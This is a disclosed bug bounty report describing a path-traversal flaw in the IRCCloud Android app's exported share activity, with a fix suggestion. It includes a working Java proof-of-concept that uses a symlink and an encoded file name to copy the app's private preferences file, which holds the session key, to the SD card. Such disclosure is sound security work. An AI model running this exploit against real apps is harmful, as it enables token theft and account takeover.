# [IRCCloud Android] Theft of arbitrary files leading to token leakage

## Report Details
- **Report ID**: 288955
- **URL**: https://hackerone.com/reports/288955
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-11-09T20:52:38.854Z
- **Disclosed**: 2017-11-15T15:23:32.609Z

## Reporter
- **Username**: bagipro
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: irccloud

## Vulnerability Information
#Bug description#

Hi, I'd like to report a vulnerability which allows to theft arbitrary protected files (and as a result takeover account, because all tokens will be leaked), similar to my bug reported to Harvest https://hackerone.com/reports/161710

This one is really tricky, passed two days to realize how to exploit that ;)

Activity ``` com.irccloud.android.activity.ShareChooserActivity ``` is exported and designed to allow file sharing from third-party apps to IRC Cloud
```xml
        <activity android:excludeFromRecents="true" android:name="com.irccloud.android.activity.ShareChooserActivity" android:theme="@style/dawnDialog">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.SEND"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="application/*"/>
                <data android:mimeType="audio/*"/>
                <data android:mimeType="image/*"/>
                <data android:mimeType="text/*"/>
                <data android:mimeType="video/*"/>
            </intent-filter>
            <meta-data android:name="android.service.chooser.chooser_target_service" android:value=".ConversationChooserTargetService"/>
        </activity>
```

```java
    protected void onResume() {
        //...
        if (getSharedPreferences("prefs", 0).getString("session_key", "").length() > 0) {
            	//...
                this.mUri = (Uri) getIntent().getParcelableExtra("android.intent.extra.STREAM"); // getting attacker provided uri
                if (this.mUri != null) {
                    this.mUri = MainActivity.makeTempCopy(this.mUri, this); // copying file from this uri to /data/data/com.irccloud.android/cache/
                }
```

```java
    public static Uri makeTempCopy(Uri fileUri, Context context, String original_filename) { // original_filename = mUri.getLastPathSegment()
        //...
        try {
            Uri out = Uri.fromFile(new File(context.getCacheDir(), original_filename));
            Log.d("IRCCloud", "Copying file to " + out);
            InputStream is = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openInputStream(fileUri);
            OutputStream os = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openOutputStream(out);
            byte[] buffer = new byte[8192];
            while (true) {
                int len = is.read(buffer);
                if (len != -1) {
                    os.write(buffer, 0, len);
                //...
```

It means that the specified file will be copied to ``` /data/data/com.irccloud.android/cache/ ``` with original name. Original name is ``` getLastPathSegment() ``` from the specified uri. But there is one thing: this method decodes last path segment. This is my PoC:
```java
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // path to sdcard (encoded relative path from "/data/data/com.irccloud.android/cache/")
        String zhk = "..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml";
        // absolute path to a file, pointing to sumlink
        String appDir = "/data/data/" + getPackageName();
        String deepPath = appDir + "/x/x/x/x/";

        new File(deepPath).mkdirs();

        String sumlink = deepPath + zhk;
        try {
            File sumlinkFile = new File(Uri.decode(sumlink)).getCanonicalFile();
            sumlinkFile.getParentFile().mkdirs();

            Runtime.getRuntime().exec("ln -s /data/data/com.irccloud.android/shared_prefs/prefs.xml "
                    + sumlinkFile.getAbsolutePath()).waitFor();
        }
        catch(Exception e) {
            // should be never thrown
            throw new RuntimeException(e);
        }
        grant777PermissionToEverything(new File(appDir));

        Uri uri = Uri.parse("file://" + sumlink); // file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml

        Intent intent = new Intent();
        intent.setClassName("com.irccloud.android", "com.irccloud.android.activity.ShareChooserActivity");
        intent.putExtra("android.intent.extra.STREAM", uri);
        startActivity(intent);
    }

    private void grant777PermissionToEverything(File dist) {
        dist.setReadable(true, false);
        dist.setWritable(true, false);
        dist.setExecutable(true, false);
        if(dist.isDirectory()) {
            for(File child : dist.listFiles()) {
                grant777PermissionToEverything(child);
            }
        }
    }
```

Result:
{F238129}
{F238128}

It works so:
1) I start your activity with the following uri: ``` file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml ```
2) Canonical file from #2 (``` /data/data/com.attacker/sdcard/prefs.xml ```) is a symlink file pointing to the file I want to theft (``` /data/data/com.irccloud.android/shared_prefs/prefs.xml ```)
3) In your app ``` original_filename ``` is equal to ``` ../../../../sdcard/prefs.xml ```
4) 
```java
InputStream is = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openInputStream(fileUri);
```

But ``` openInputStream(...) ``` automatically decodes the specified uri. So it will access my symlink file which points to ``` /data/data/com.irccloud.android/shared_prefs/prefs.xml ```
5) 
```java
Uri out = Uri.fromFile(new File(context.getCacheDir(), original_filename));
OutputStream os = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openOutputStream(out);
```
It is equal to 
```java
Uri out = Uri.fromFile(new File("/data/data/com.irccloud.android/cache/", "../../../../sdcard/prefs.xml"));
```

So it simply outputs the specified file to Sd card.

#How to fix#
Just specify e.g. current timestamp as a file name, but don't use provided by attacker. In current implementation attacker can force IRC Cloud app to copy arbitrary files to arbitrary directories. File ``` /data/data/com.irccloud.android/shared_prefs/prefs.xml ``` contains ``` session_key ```. In normal situation this file is accessible only to IRC Cloud app. But when it's copied to e.g. Sd card it will be accessible to everyone. But Sd card is only simple example. Attacker can also force IRC Cloud app to copy a file to its internal directory.

BTW this vulnerability also allows to overwrite arbitrary files. So attacker also can replace any your protected files and substitute for example history.

## Attachments
- Screenshot_2017-11-09-23-21-29.png
- Screenshot_2017-11-09-23-21-21.png
